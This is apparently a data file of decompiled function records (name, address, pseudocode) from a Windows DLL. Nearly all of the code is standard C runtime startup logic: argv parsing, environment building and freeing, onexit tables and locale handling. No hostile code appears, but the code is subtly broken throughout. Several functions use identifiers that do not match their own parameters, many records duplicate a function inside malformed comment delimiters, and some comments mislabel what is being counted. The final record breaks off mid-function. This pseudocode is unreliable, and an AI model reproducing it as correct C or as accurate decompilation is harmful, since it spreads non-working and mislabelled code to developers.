{"Function Name": "FUN_10025a64", "Address": "10025a64", "Source Code": "int __cdecl FUN_10025a64(int inputParameter)\n{\n    int returnValue; \n    undefined4 *errorPointer; \n    uchar **parsedArgumentsPointer; \n    uchar **allocatedBufferPointer; \n    char *commandLineString; \n    uint argumentCount; \n    uint additionalInfo; \n    if (inputParameter == 0) { \n        returnValue = 0; \n    }\n    else if ((inputParameter == 2) || (inputParameter == 1)) { \n        FUN_1002c980(); \n        returnValue = 0; \n        GetModuleFileNameA((HMODULE)0x0, &DAT_1004fde0, 0x104); \n        _DAT_100502b4 = &DAT_1004fde0; \n        commandLineString = DAT_100502ac; \n        if ((DAT_100502ac == (char *)0x0) || (*DAT_100502ac == '\\0')) { \n            commandLineString = &DAT_1004fde0; \n        }\n        argumentCount = 0; \n        additionalInfo = 0; \n        parse_command_line<char>(commandLineString, (char **)0x0, (char *)0x0, &argumentCount, &additionalInfo); \n        parsedArgumentsPointer = (uchar **)___acrt_allocate_buffer_for_argv(argumentCount, additionalInfo, 1); \n        allocatedBufferPointer = parsedArgumentsPointer; \n        if (parsedArgumentsPointer == (uchar **)0x0) { \n            errorPointer = (undefined4 *)FUN_100253b8(); \n            returnValue = 0xc; \n            *errorPointer = 0xc; \n        }\n        else {\n            parse_command_line<char>(commandLineString, (char **)parsedArgumentsPointer, (char *)(parsedArgumentsPointer + argumentCount), &argumentCount, &additionalInfo); \n            if (inputParameter == 1) { \n                _DAT_100502a0 = argumentCount - 1; \n                DAT_100502a4 = parsedArgumentsPointer; \n            }\n            else { \n                uchar **argumentCounterPointer = (uchar **)0x0; \n                returnValue = FUN_1002c43d(parsedArgumentsPointer, &argumentCounterPointer); \n                if (returnValue == 0) { \n                    _DAT_100502a0 = 0; \n                    while (*argumentCounterPointer != (uchar *)0x0) { \n                        argumentCounterPointer++; \n                        _DAT_100502a0++; \n                    }\n                    returnValue = 0; \n                    DAT_100502a4 = parsedArgumentsPointer; \n                }\n                FID_conflict__free(argumentCounterPointer); \n            }\n        }\n        FID_conflict__free(allocatedBufferPointer); \n    }\n    else { \n        errorPointer = (undefined4 *)FUN_100253b8(); \n        returnValue = 0x16; \n        *errorPointer = 0x16; \n        FUN_1001de96(); \n    }\n    return returnValue; \n}"}
{"Function Name": "parse_command_line<char>", "Address": "10025b9a", "Source Code": "\\*\nvoid __cdecl\nparse_command_line<char>(char *param_1, char **param_2, char *param_3, uint *param_4, uint *param_5)\n{\n    *param_5 = 0; // Initialize the count of parsed arguments to 0\n    *param_4 = 1; // Initialize the count of total arguments to 1 (for the command itself)\n    \n    if (param_2 != (char **)0x0) { // Check if the output argument array is not null\n        *param_2 = param_3; // Set the first argument pointer to the start of the output buffer\n        param_2++; // Move to the next position in the output argument array\n    }\n    \n    bool bVar5 = false; // Flag to track if we are inside quotes\n    char *pcVar6 = param_1; // Pointer to traverse the input command line\n\n    do {\n        char cVar2 = *pcVar6; // Get the current character\n        if (cVar2 == '\\\"') { // Check for the start/end of a quoted string\n            bVar5 = !bVar5; // Toggle the quote flag\n            pcVar6++; // Move to the next character\n        } else {\n            (*param_5)++; // Increment the argument count\n            if (param_3 != (char *)0x0) { // Check if the output buffer is not null\n                *param_3 = cVar2; // Store the current character in the output buffer\n                param_3++; // Move to the next position in the output buffer\n            }\n            if (__ismbblead((int)cVar2)) { // Check if the character is a lead byte (for multibyte characters)\n                (*param_5)++; // Increment the argument count for the second byte\n                if (param_3 != (char *)0x0) { // Check if the output buffer is not null\n                    *param_3 = *(pcVar6 + 1); // Store the second byte in the output buffer\n                    param_3++; // Move to the next position in the output buffer\n                }\n                pcVar6 += 2; // Move past both bytes\n            } else {\n                pcVar6++; // Move to the next character\n            }\n            if (cVar2 == '\\0') { // Check for the end of the string\n                pcVar6--; // Adjust the pointer to avoid going past the end\n                break; // Exit the loop\n            }\n        }\n    } while (bVar5 || (cVar2 != ' ' && cVar2 != '\\t')); // Continue while inside quotes or not at a space/tab\n\n    if (param_3 != (char *)0x0) { // Check if the output buffer is not null\n        param_3[-1] = '\\0'; // Null-terminate the last argument\n    }\n\n    while (*pcVar6 != '\\0') { // Loop until the end of the input string\n        while (*pcVar6 == ' ' || *pcVar6 == '\\t') { // Skip spaces and tabs\n            pcVar6++; // Move to the next character\n        }\n        if (*pcVar6 == '\\0') break; // Break if we reach the end\n\n        if (param_2 != (char **)0x0) { // Check if the output argument array is not null\n            *param_2 = param_3; // Set the next argument pointer to the current output buffer position\n            param_2++; // Move to the next position in the output argument array\n        }\n        (*param_4)++; // Increment the total argument count\n\n        while (true) { // Loop to process the current argument\n            bool bVar1 = true; // Flag to track if we are in a valid character sequence\n            uint uVar3 = 0; // Counter for backslashes\n            while (*pcVar6 == '\\\\') { // Count consecutive backslashes\n                uVar3++; // Increment the backslash counter\n                pcVar6++; // Move to the next character\n            }\n            if (*pcVar6 == '\\\"') { // Check for a quote character\n                if ((uVar3 & 1) == 0 && (!bVar5 || *(pcVar6 + 1) != '\\\"')) { // Check if the quote is valid\n                    bVar1 = false; // Set flag to false if the quote is not valid\n                    bVar5 = !bVar5; // Toggle the quote flag\n                }\n                uVar3 >>= 1; // Halve the backslash count (for escaping)\n            }\n            while (uVar3 != 0) { // Process any remaining backslashes\n                if (param_3 != (char *)0x0) { // Check if the output buffer is not null\n                    *param_3 = '\\\\'; // Store a backslash in the output buffer\n                    param_3++; // Move to the next position in the output buffer\n                }\n                (*param_5)++; // Increment the argument count\n                uVar3--; // Decrement the backslash counter\n            }\n            char cVar2 = *pcVar6; // Get the current character\n            if (cVar2 == '\\0' || (!bVar5 && (cVar2 == ' ' || cVar2 == '\\t'))) break; // Break if at end or outside quotes\n            if (bVar1) { // If we are in a valid character sequence\n                if (param_3 != (char *)0x0) { // Check if the output buffer is not null\n                    *param_3 = cVar2; // Store the current character in the output buffer\n                    param_3++; // Move to the next position in the output buffer\n                }\n                if (__ismbblead((int)cVar2)) { // Check if the character is a lead byte\n                    pcVar6++; // Move to the next character\n                    (*param_5)++; // Increment the argument count for the second byte\n                    if (param_3 != (char *)0x0) { // Check if the output buffer is not null\n                        *param_3 = *pcVar6; // Store the second byte in the output buffer\n                        param_3++; // Move to the next position in the output buffer\n                    }\n                }\n                (*param_5)++; // Increment the argument count\n            }\n            pcVar6++; // Move to the next character\n        }\n        if (param_3 != (char *)0x0) { // Check if the output buffer is not null\n            *param_3 = '\\0'; // Null-terminate the current argument\n            param_3++; // Move to the next position in the output buffer\n        }\n        (*param_5)++; // Increment the argument count\n    }\n    if (param_2 != (char **)0x0) { // Check if the output argument array is not null\n        *param_2 = (char *)0x0; // Null-terminate the argument array\n    }\n    (*param_4)++; // Increment the total argument count\n    return; // Exit the function\n}\n*\\ \n \n\nvoid __cdecl\nparse_command_line<char>(char *param_1, char **param_2, char *param_3, uint *param_4, uint *param_5)\n{\n    *param_5 = 0;\n    *param_4 = 1;\n    if (param_2 != (char **)0x0) {\n        *param_2 = param_3;\n        param_2++;\n    }\n    bool bVar5 = false;\n    char *pcVar6 = param_1;\n\n    do {\n        char cVar2 = *pcVar6;\n        if (cVar2 == '\\\"') {\n            bVar5 = !bVar5;\n            pcVar6++;\n        } else {\n            (*param_5)++;\n            if (param_3 != (char *)0x0) {\n                *param_3 = cVar2;\n                param_3++;\n            }\n            if (__ismbblead((int)cVar2)) {\n                (*param_5)++;\n                if (param_3 != (char *)0x0) {\n                    *param_3 = *(pcVar6 + 1);\n                    param_3++;\n                }\n                pcVar6 += 2;\n            } else {\n                pcVar6++;\n            }\n            if (cVar2 == '\\0') {\n                pcVar6--;\n                break;\n            }\n        }\n    } while (bVar5 || (cVar2 != ' ' && cVar2 != '\\t'));\n\n    if (param_3 != (char *)0x0) {\n        param_3[-1] = '\\0';\n    }\n\n    while (*pcVar6 != '\\0') {\n        while (*pcVar6 == ' ' || *pcVar6 == '\\t') {\n            pcVar6++;\n        }\n        if (*pcVar6 == '\\0') break;\n\n        if (param_2 != (char **)0x0) {\n            *param_2 = param_3;\n            param_2++;\n        }\n        (*param_4)++;\n\n        while (true) {\n            bool bVar1 = true;\n            uint uVar3 = 0;\n            while (*pcVar6 == '\\\\') {\n                uVar3++;\n                pcVar6++;\n            }\n            if (*pcVar6 == '\\\"') {\n                if ((uVar3 & 1) == 0 && (!bVar5 || *(pcVar6 + 1) != '\\\"')) {\n                    bVar1 = false;\n                    bVar5 = !bVar5;\n                }\n                uVar3 >>= 1;\n            }\n            while (uVar3 != 0) {\n                if (param_3 != (char *)0x0) {\n                    *param_3 = '\\\\';\n                    param_3++;\n                }\n                (*param_5)++;\n                uVar3--;\n            }\n            char cVar2 = *pcVar6;\n            if (cVar2 == '\\0' || (!bVar5 && (cVar2 == ' ' || cVar2 == '\\t'))) break;\n            if (bVar1) {\n                if (param_3 != (char *)0x0) {\n                    *param_3 = cVar2;\n                    param_3++;\n                }\n                if (__ismbblead((int)cVar2)) {\n                    pcVar6++;\n                    (*param_5)++;\n                    if (param_3 != (char *)0x0) {\n                        *param_3 = *pcVar6;\n                        param_3++;\n                    }\n                }\n                (*param_5)++;\n            }\n            pcVar6++;\n        }\n        if (param_3 != (char *)0x0) {\n            *param_3 = '\\0';\n            param_3++;\n        }\n        (*param_5)++;\n    }\n    if (param_2 != (char **)0x0) {\n        *param_2 = (char *)0x0;\n    }\n    (*param_4)++;\n    return;\n}\n"}
{"Function Name": "___acrt_allocate_buffer_for_argv", "Address": "10025d0f", "Source Code": "LPVOID __cdecl ___acrt_allocate_buffer_for_argv(uint max_buffer_size, uint num_elements, uint element_size)\n{\n    \n    if ((max_buffer_size < 0x3fffffff) && (num_elements < (uint)(0xffffffff / (ulonglong)element_size))) {\n        \n        if (num_elements * element_size < max_buffer_size * -4 - 1) {\n            \n            return __calloc_base(num_elements * element_size + max_buffer_size * 4, 1);\n        }\n    }\n    \n    return (LPVOID)0x0;\n}"}
{"Function Name": "FUN_10025d64", "Address": "10025d64", "Source Code": "void __cdecl FUN_10025d64(int input_parameter) \n{\n    FUN_10025a64(input_parameter); \n}"}
{"Function Name": "create_environment<char>", "Address": "10025dc8", "Source Code": "char ** __cdecl create_environment<char>(char *param_1)\n{\n    char **envVarPointers; \n    char *allocatedVar; \n    errno_t errorCode; \n    char *currentVarEnd; \n    int envVarCount = 0; \n    \n    while (*param_1 != '\\0') {\n        if (*param_1 != '=') {\n            envVarCount++; \n        }\n        \n        while (*param_1 != '\\0') {\n            param_1++;\n        }\n        param_1++; \n    }\n    \n    \n    envVarPointers = (char **)__calloc_base(envVarCount + 1, 4);\n    if (envVarPointers == (char **)0x0) {\n        return (char **)0x0; \n    }\n    char **currentEnvVarPointer = envVarPointers; \n    \n    while (*param_1 != '\\0') {\n        currentVarEnd = param_1; \n        \n        while (*currentVarEnd != '\\0') {\n            currentVarEnd++;\n        }\n        \n        if (*param_1 != '=') {\n            allocatedVar = (char *)__calloc_base((uint)(currentVarEnd - param_1 + 1), 1); \n            if (allocatedVar == (char *)0x0) {\n                free_environment<char>(envVarPointers); \n                return (char **)0x0; \n            }\n            \n            errorCode = _strcpy_s(allocatedVar, (rsize_t)(currentVarEnd - param_1 + 1), param_1);\n            if (errorCode != 0) {\n                \n                __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n            }\n            *currentEnvVarPointer++ = allocatedVar; \n        }\n        param_1 = currentVarEnd + 1; \n    }\n    return envVarPointers; \n}"}
{"Function Name": "free_environment<char>", "Address": "10025e99", "Source Code": "\\*\nvoid __cdecl free_environment<char>(char **param_1)\n{\n    \n    if (string_array != (char **)0x0) {\n        \n        char **string_pointer = string_array;\n        \n        char *current_string = *string_pointer;\n        \n        while (current_string != (char *)0x0) {\n            \n            FID_conflict__free(current_string);\n            \n            current_string = *(++string_pointer);\n        }\n        \n        FID_conflict__free(string_array);\n    }\n}\n*\\ \n \nvoid __cdecl free_environment<char>(char **param_1)\n{\n    if (string_array != (char **)0x0) {\n        char **string_pointer = string_array;\n        char *current_string = *string_pointer;\n        while (current_string != (char *)0x0) {\n            FID_conflict__free(current_string);\n            current_string = *(++string_pointer);\n        }\n        FID_conflict__free(string_array);\n    }\n}"}
{"Function Name": "uninitialize<>", "Address": "10025ec8", "Source Code": "\\*\nvoid __thiscall uninitialize<>(void *instance, undefined *function_ptr)\n{\n    uint security_cookie;\n    \n    security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    for (void *end_address = (void *)((int)instance + 4); instance != end_address; instance = (void *)((int)instance + 4)) {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)(instance);\n        \n        \n        (*(code *)function_ptr)();\n    }\n    \n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc);\n    \n    \n    return;\n}\n*\\ \n \nvoid __thiscall uninitialize<>(void *instance, undefined *function_ptr)\n{\n    uint security_cookie;\n    security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    for (void *end_address = (void *)((int)instance + 4); instance != end_address; instance = (void *)((int)instance + 4)) {\n        (*(code *)PTR__guard_check_icall_1003a2f8)(instance);\n        (*(code *)function_ptr)();\n    }\n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc);\n    return;\n}"}
{"Function Name": "uninitialize_environment_internal<>", "Address": "10025f08", "Source Code": "\\*\nvoid __cdecl uninitialize_environment_internal<>(undefined4 *environment_pointer)\n{\n    \n    if ((char **)*environment_pointer != predefined_constant) {\n        \n        free_environment<char>((char **)*environment_pointer);\n    }\n}\n*\\ \n \nvoid __cdecl uninitialize_environment_internal<>(undefined4 *environment_pointer)\n{\n    if ((char **)*environment_pointer != predefined_constant) {\n        free_environment<char>((char **)*environment_pointer);\n    }\n}"}
{"Function Name": "uninitialize_environment_internal<>", "Address": "10025f23", "Source Code": "\\*\nvoid __cdecl uninitialize_environment_internal<>(undefined4 *environment_pointer)\n{\n    \n    if ((char **)*environment_pointer != predefined_constant) {\n        \n        free_environment<char>((char **)*environment_pointer);\n    }\n}\n*\\ \n \nvoid __cdecl uninitialize_environment_internal<>(undefined4 *environment_pointer)\n{\n    if ((char **)*environment_pointer != predefined_constant) {\n        free_environment<char>((char **)*environment_pointer);\n    }\n}"}
{"Function Name": "FUN_10025f3e", "Address": "10025f3e", "Source Code": "void FUN_10025f3e(void)\n{\n    \n    uninitialize<>(&first_data_reference, uninitialize_environment_internal<>);\n    \n    \n    uninitialize<>(&second_data_reference, uninitialize_environment_internal<>);\n    \n    \n    free_environment<char>(first_character_data_reference);\n    \n    \n    free_environment<char>(second_character_data_reference);\n}"}
{"Function Name": "operator()<>", "Address": "10025f7a", "Source Code": "\\*\nundefined4 operator()<>(int *lock_value, int **function_pointer)\n{\n    \n    ___acrt_lock(*param_1);\n    \n    \n    return FUN_100261cc(function_pointer);\n}\n*\\ \n \nundefined4 operator()<>(int *lock_value,int **function_pointer)\n{\n    ___acrt_lock(*lock_value);\n    return FUN_100261cc(function_pointer);\n}"}
{"Function Name": "__acrt_lock_and_call<class_<lambda_4e60a939b0d047cfe11ddc22648dfba9>_>", "Address": "1002601c", "Source Code": "\\*\nint __cdecl\n__acrt_lock_and_call<class_<lambda_4e60a939b0d047cfe11ddc22648dfba9>_>\n(__acrt_lock_id param_1,<lambda_4e60a939b0d047cfe11ddc22648dfba9> *param_2)\n{\n    \n    __crt_seh_guarded_call<int> local_5;\n    \n    return __crt_seh_guarded_call<int>::\n        operator()<class_<lambda_800076c951b434888f4765a74a194fcc>,class_<lambda_4e60a939b0d047cfe11ddc22648dfba9>&,class_<lambda_6dbb1268764f43b569ce7b67e331d33a>_>\n        (&local_5, \n         (class_<lambda_800076c951b434888f4765a74a194fcc> *)&param_1, \n         param_2, \n         (class_<lambda_6dbb1268764f43b569ce7b67e331d33a> *)&param_1); \n}\n*\\ \n \nint __cdecl\n__acrt_lock_and_call<class_<lambda_4e60a939b0d047cfe11ddc22648dfba9>_>\n(__acrt_lock_id param_1,<lambda_4e60a939b0d047cfe11ddc22648dfba9> *param_2)\n{\n    __crt_seh_guarded_call<int> local_5;\n    return __crt_seh_guarded_call<int>::\n        operator()<class_<lambda_800076c951b434888f4765a74a194fcc>,class_<lambda_4e60a939b0d047cfe11ddc22648dfba9>&,class_<lambda_6dbb1268764f43b569ce7b67e331d33a>_>\n        (&local_5, (class_<lambda_800076c951b434888f4765a74a194fcc> *)&param_1, param_2, (class_<lambda_6dbb1268764f43b569ce7b67e331d33a> *)&param_1);\n}"}
{"Function Name": "__acrt_lock_and_call<class_<lambda_275893d493268fdec8709772e3fcec0e>_>", "Address": "10026044", "Source Code": "\\*\nint __cdecl\n__acrt_lock_and_call<class_<lambda_275893d493268fdec8709772e3fcec0e>_>\n(__acrt_lock_id param_1,<lambda_275893d493268fdec8709772e3fcec0e> *param_2)\n{\n    \n    return operator()<>((int *)&param_1,(int **)param_2);\n}\n*\\ \n \nint __cdecl\n__acrt_lock_and_call<class_<lambda_275893d493268fdec8709772e3fcec0e>_>\n(__acrt_lock_id param_1,<lambda_275893d493268fdec8709772e3fcec0e> *param_2)\n{\n    return operator()<>((int *)&param_1,(int **)param_2);\n}"}
{"Function Name": "__crt_fast_encode_pointer<>", "Address": "1002606c", "Source Code": "\\*\nuint __cdecl __crt_fast_encode_pointer<>(uint param_1)\n{\n    \n    \n    \n    return (input_value >> (0x20 - ((byte)shift_mask & 0x1f) & 0x1f) | \n            input_value << ((byte)shift_mask & 0x1f)) ^ \n           shift_mask; \n}\n*\\ \n \nuint __cdecl __crt_fast_encode_pointer<>(uint param_1)\n{\n    return (input_value >> (0x20 - ((byte)shift_mask & 0x1f) & 0x1f) | input_value << ((byte)shift_mask & 0x1f)) ^ shift_mask;\n}"}
{"Function Name": "FUN_100261cc", "Address": "100261cc", "Source Code": "void __fastcall FUN_100261cc(int **param_1)\n{\n    uint tempUnsignedInt; \n    byte tempByteValue; \n    uint calculatedValue; \n    uint anotherUnsignedInt; \n    uint *unsignedIntPointer; \n    sbyte signedByteValue; \n    uint *firstElementPointer; \n    uint lowerBitsValue; \n    uint nextValue; \n    uint *nextElementPointer; \n    uint *memoryPointer; \n    \n    calculatedValue = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    firstElementPointer = (uint *)**param_1; \n    \n    if (firstElementPointer != (uint *)0x0) {\n        lowerBitsValue = DAT_1004e008 & 0x1f; \n        signedByteValue = (sbyte)lowerBitsValue; \n        \n        memoryPointer = (uint *)((*firstElementPointer ^ DAT_1004e008) >> signedByteValue | (*firstElementPointer ^ DAT_1004e008) << 0x20 - signedByteValue);\n        firstElementPointer = (uint *)((firstElementPointer[1] ^ DAT_1004e008) >> signedByteValue | (firstElementPointer[1] ^ DAT_1004e008) << 0x20 - signedByteValue);\n        \n        \n        if ((memoryPointer != (uint *)0x0) && (memoryPointer != (uint *)0xffffffff)) {\n            tempByteValue = 0x20U - signedByteValue & 0x1f; \n            anotherUnsignedInt = (0U >> tempByteValue | 0 << 0x20 - tempByteValue) ^ DAT_1004e008; \n            \n            \n            while (firstElementPointer = firstElementPointer + -1, memoryPointer <= firstElementPointer) {\n                \n                if (*firstElementPointer != anotherUnsignedInt) {\n                    tempUnsignedInt = *firstElementPointer; \n                    *firstElementPointer = anotherUnsignedInt; \n                    (*(code *)PTR__guard_check_icall_1003a2f8)(); \n                    \n                    (*(code *)((tempUnsignedInt ^ DAT_1004e008) >> (sbyte)lowerBitsValue | (tempUnsignedInt ^ DAT_1004e008) << 0x20 - (sbyte)lowerBitsValue))();\n                    lowerBitsValue = DAT_1004e008 & 0x1f; \n                    nextValue = *(uint *)**param_1 ^ DAT_1004e008; \n                    signedByteValue = (sbyte)lowerBitsValue; \n                    nextElementPointer = (uint *)(nextValue >> signedByteValue | nextValue << 0x20 - signedByteValue); \n                    nextValue = ((uint *)**param_1)[1] ^ DAT_1004e008; \n                    unsignedIntPointer = (uint *)(nextValue >> signedByteValue | nextValue << 0x20 - signedByteValue); \n                    \n                    \n                    if (nextElementPointer != memoryPointer || unsignedIntPointer != firstElementPointer) {\n                        firstElementPointer = unsignedIntPointer; \n                        memoryPointer = nextElementPointer; \n                    }\n                }\n            }\n        }\n        \n        \n        if (memoryPointer != (uint *)0xffffffff) {\n            FID_conflict__free(memoryPointer); \n        }\n        \n        tempByteValue = 0x20 - ((byte)DAT_1004e008 & 0x1f) & 0x1f; \n        lowerBitsValue = (0U >> tempByteValue | 0 << 0x20 - tempByteValue) ^ DAT_1004e008; \n        *(uint *)**param_1 = lowerBitsValue; \n        *(uint *)(**param_1 + 4) = lowerBitsValue; \n        *(uint *)(**param_1 + 8) = lowerBitsValue; \n    }\n    \n    \n    ___security_check_cookie_4(calculatedValue ^ (uint)&stack0xfffffffc);\n    return; \n}"}
{"Function Name": "__crt_atexit", "Address": "100262ea", "Source Code": "void register_exit_function(undefined4 exit_param) \n{\n    register_on_exit(0xf8, (undefined1)exit_param); \n}"}
{"Function Name": "__execute_onexit_table", "Address": "10026300", "Source Code": "void __execute_onexit_table(undefined exit_param) \n{\n    \n    __acrt_lock_and_call<class_<lambda_275893d493268fdec8709772e3fcec0e>>(2, (class_<lambda_275893d493268fdec8709772e3fcec0e> *)&exit_param);\n}"}
{"Function Name": "__initialize_onexit_table", "Address": "1002631d", "Source Code": "undefined4 __cdecl __initialize_onexit_table(uint *input_array)\n{\n    undefined4 return_value;\n    \n    if (input_array == (uint *)0x0) {\n        return_value = 0xffffffff; \n    } else {\n        \n        if (*input_array == input_array[2]) {\n            \n            *input_array = (0U >> (0x20 - ((byte)computed_value & 0x1f) & 0x1f) | 0 << (0x20 - ((byte)computed_value & 0x1f))) ^ computed_value;\n            \n            input_array[1] = *input_array;\n            \n            input_array[2] = *input_array;\n        }\n        return_value = 0; \n    }\n    return return_value; \n}"}
{"Function Name": "FUN_100263f8", "Address": "100263f8", "Source Code": "undefined free_memory_and_return_success(void)\n{\n    \n    <multibyte_data_handler>::operator()((__crt_multibyte_data **)&DAT_10050294);\n    \n    \n    FID_conflict__free(allocated_memory_1);\n    \n    allocated_memory_1 = (void *)0x0;\n    \n    \n    FID_conflict__free(allocated_memory_2);\n    \n    allocated_memory_2 = (void *)0x0;\n    \n    \n    FID_conflict__free(allocated_memory_3);\n    \n    allocated_memory_3 = (void *)0x0;\n    \n    \n    FID_conflict__free(allocated_memory_4);\n    \n    allocated_memory_4 = (void *)0x0;\n    \n    \n    return 1;\n}"}
{"Function Name": "___acrt_initialize", "Address": "1002648a", "Source Code": "void initialize_acrt(void)\n{\n    \n    execute_initializers(&pointer_lab, (undefined **)&data_ef20);\n}"}
{"Function Name": "___acrt_uninitialize", "Address": "100264af", "Source Code": "void uninitialize_acrt(void)\n{\n    \n    \n    execute_uninitializers(&uninitializers_pointer, (undefined **)&data_pointer);\n}"}
{"Function Name": "___acrt_uninitialize_critical", "Address": "100264c1", "Source Code": "undefined4 uninitializeCritical(undefined4 parameter)\n{\n    \n    \n    \n    return combineResult((threeByteInt)((uint)uninitializePTD() >> 8), 1);\n}"}
{"Function Name": "__initterm", "Address": "100264d3", "Source Code": "void __cdecl __initterm(undefined **function_ptr_start, undefined **function_ptr_end)\n{\n    code *function_ptr; \n    uint security_cookie;   \n    uint function_count;   \n    \n    security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    \n    function_count = ~-(uint)(function_ptr_end < function_ptr_start) & (uint)((int)function_ptr_end + (3 - (int)function_ptr_start)) >> 2;\n    \n    \n    if (function_count != 0) {\n        \n        for (uint index = 0; index < function_count; index++) {\n            function_ptr = (code *)*function_ptr_start; \n            \n            \n            if (function_ptr != (code *)0x0) {\n                \n                (*(code *)PTR__guard_check_icall_1003a2f8)();\n                (*function_ptr)(); \n            }\n            function_ptr_start++; \n        }\n    }\n    \n    \n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc);\n    return; \n}"}
{"Function Name": "__initterm_e", "Address": "1002652f", "Source Code": "void __cdecl __initterm_e(undefined **function_ptr_start, undefined **function_ptr_end)\n{\n    code *function_ptr; \n    uint security_cookie;   \n    \n    security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    for (; function_ptr_start != function_ptr_end; function_ptr_start++) {\n        function_ptr = (code *)*function_ptr_start; \n        if (function_ptr != (code *)0x0) { \n            (*(code *)PTR__guard_check_icall_1003a2f8)(); \n            if ((*function_ptr)() != 0) break; \n        }\n    }\n    \n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc);\n    return; \n}"}
{"Function Name": "operator()<>", "Address": "10026626", "Source Code": "\\*\nundefined4 * operator()<>(int *resource_lock, int **function_param)\n{\n    \n    ___acrt_lock(*resource_lock);\n    \n    \n    return FUN_1002669f(function_param);\n}\n*\\ \n \nundefined4 * operator()<>(int *resource_lock,int **function_param)\n{\n    ___acrt_lock(*resource_lock);\n    return FUN_1002669f(function_param);\n}"}
{"Function Name": "FID_conflict:__acrt_lock_stream_and_call<class_<lambda_3126a0d026c48c72336a1719c85146ae>_>", "Address": "10026677", "Source Code": "\\*\nvoid __cdecl\nFID_conflict___acrt_lock_stream_and_call<class_<lambda_3126a0d026c48c72336a1719c85146ae>_>\n(int param_1, int **param_2) \n{\n    operator()<>(&param_1, param_2); \n    return; \n}\n*\\ \n \nvoid __cdecl\nFID_conflict___acrt_lock_stream_and_call<class_<lambda_3126a0d026c48c72336a1719c85146ae>_>\n(int param_1,int **param_2)\n{\n    operator()<>(&param_1,param_2);\n    return;\n}"}
{"Function Name": "FUN_1002669f", "Address": "1002669f", "Source Code": "\\*\nundefined4 * __fastcall FUN_1002669f(int **param_1)\n{\n    pthreadlocinfo localeInfo; // Variable to hold locale information\n    undefined4 *sourceWideCharString; // Pointer to source wide character string\n    errno_t errorCode; // Variable to hold error codes\n    uint *allocatedMemory; // Pointer to allocated memory\n    localeinfo_struct localeInfoStruct; // Structure to hold locale info\n    __acrt_ptd *threadLocalData; // Pointer to thread-local data\n    size_t convertedStringSize; // Variable to hold size of converted string\n\n    // Call to set the locale and get the source wide character string\n    sourceWideCharString = (undefined4 *)_call_wsetlocale(**param_1, (char *)*param_1[1]);\n    if (sourceWideCharString != (undefined4 *)0x0) { // Check if locale setting was successful\n        threadLocalData = FUN_10029224(); // Get thread-local data\n        localeInfoStruct.locinfo = *(pthreadlocinfo *)(threadLocalData + 0x4c); // Retrieve locale information\n        localeInfoStruct.mbcinfo = *(pthreadmbcinfo *)(threadLocalData + 0x48); // Retrieve multi-byte character info\n        convertedStringSize = 0; // Initialize size variable\n        // Convert wide string to multi-byte string, size is set to local_8\n        errorCode = __wcstombs_s_l(&convertedStringSize, (char *)0x0, 0, (wchar_t *)sourceWideCharString, 0, &localeInfoStruct);\n        if (errorCode == 0) { // Check if conversion was successful\n            allocatedMemory = (uint *)__malloc_base(convertedStringSize + 4); // Allocate memory for the converted string\n            if (allocatedMemory != (uint *)0x0) { // Check if memory allocation was successful\n                // Perform the actual conversion to multi-byte string\n                errorCode = __wcstombs_s_l((size_t *)0x0, (char *)(allocatedMemory + 1), convertedStringSize, (wchar_t *)sourceWideCharString, 0xffffffff, &localeInfoStruct);\n                localeInfo = localeInfoStruct.locinfo; // Get the locale info again\n                if (errorCode == 0) { // Check if conversion was successful\n                    int *localeReference = (int *)(localeInfoStruct.locinfo)->lc_category[**param_1 + 1].wlocale; // Get the locale reference\n                    if (localeReference != (int *)0x0) { // Check if locale reference is valid\n                        LOCK(); // Acquire lock for thread safety\n                        int currentReferenceCount = *localeReference; // Get the current reference count\n                        *localeReference = currentReferenceCount + -1; // Decrement the reference count\n                        UNLOCK(); // Release lock\n                        if (currentReferenceCount + -1 == 0) { // Check if reference count reached zero\n                            FID_conflict__free((localeInfoStruct.locinfo)->lc_category[**param_1 + 1].wlocale); // Free the locale memory\n                            localeInfo->lc_category[**param_1 + 1].wlocale = (wchar_t *)0x0; // Nullify the locale reference\n                        }\n                    }\n                    // Check for specific conditions before decrementing reference count again\n                    if (((((byte)threadLocalData[0x350] & 2) == 0) && (((byte)DAT_1004e808 & 1) == 0)) &&\n                        (localeReference = (int *)localeInfo->lc_category[**param_1 + 1].wlocale, localeReference != (int *)0x0)) {\n                        LOCK(); // Acquire lock for thread safety\n                        int currentReferenceCount = *localeReference; // Get the current reference count\n                        *localeReference = *localeReference + -1; // Decrement the reference count\n                        UNLOCK(); // Release lock\n                        if (currentReferenceCount == 1) { // Check if reference count reached one\n                            FID_conflict__free(localeInfo->lc_category[**param_1 + 1].wlocale); // Free the locale memory\n                            localeInfo->lc_category[**param_1 + 1].wlocale = (wchar_t *)0x0; // Nullify the locale reference\n                        }\n                    }\n                    *allocatedMemory = localeInfo->lc_time_cp; // Store the current time code page\n                    localeInfo->lc_category[**param_1 + 1].wlocale = (wchar_t *)allocatedMemory; // Set the new locale reference\n                    localeInfo->lc_category[**param_1].wrefcount = (int *)(allocatedMemory + 1); // Set the reference count pointer\n                    return allocatedMemory + 1; // Return the pointer to the allocated memory\n                }\n                // Handle specific error codes\n                if ((errorCode == 0x16) || (errorCode == 0x22)) goto LAB_10026803; // Jump to error handling\n                FID_conflict__free(allocatedMemory); // Free allocated memory on conversion failure\n            }\n        } else if ((errorCode == 0x16) || (errorCode == 0x22)) {\nLAB_10026803:\n            __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); // Invoke error handling\n        }\n        sourceWideCharString = (undefined4 *)0x0; // Set source to null on failure\n    }\n    return sourceWideCharString; // Return the source pointer (null if failed)\n}\n*\\ \n \n\nundefined4 * __fastcall FUN_1002669f(int **param_1)\n{\n    pthreadlocinfo localeInfo;\n    undefined4 *sourceWideCharString;\n    errno_t errorCode;\n    uint *allocatedMemory;\n    localeinfo_struct localeInfoStruct;\n    __acrt_ptd 